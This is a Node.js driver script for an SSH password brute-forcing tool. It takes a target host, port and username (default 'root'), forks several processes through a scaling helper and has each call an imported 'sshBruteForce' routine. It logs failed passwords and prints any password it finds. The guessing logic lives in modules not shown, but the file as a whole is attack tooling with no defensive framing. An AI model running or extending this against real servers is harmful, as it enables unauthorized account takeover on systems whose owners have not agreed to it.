const options = require('minimist')(process.argv)
const humanizeDuration = require('humanize-duration')
const sshBruteForce = require('./utils/sshBruteForce')
const verticalScaling = require('./utils/verticalScaling')

const start = Date.now()
const host = options.host || '127.0.0.1'
const port = options.port || 22
const username = options.username || 'root'
const verbose = options.verbose || options.v
const forks = options.forks

verticalScaling({
  verbose,
  onFork: async ({ index, forks, filter }) => {
    try {
      const password = await sshBruteForce({
        host,
        port,
        username,
        verbose,
        filter: (password, passwordIndex) => filter(passwordIndex),
        onFailure: (password, passwordIndex) =>
          verbose
            ? console.log(`Password ${password} (${passwordIndex}) fail on fork ${index}`)
            : process.stdout.write('.'),
      })
      process.stdout.write('\n')

      if (password !== null) {
        console.log(password)
      } else {
        throw new Error('Password not found!')
      }

      process.exit(0)
    } catch (error) {
      console.error(error)
      process.exit(1)
    }
  },

  onMaster: () => console.log(`Trying SSH connections to ${username}@${host} on port ${port}`),
})
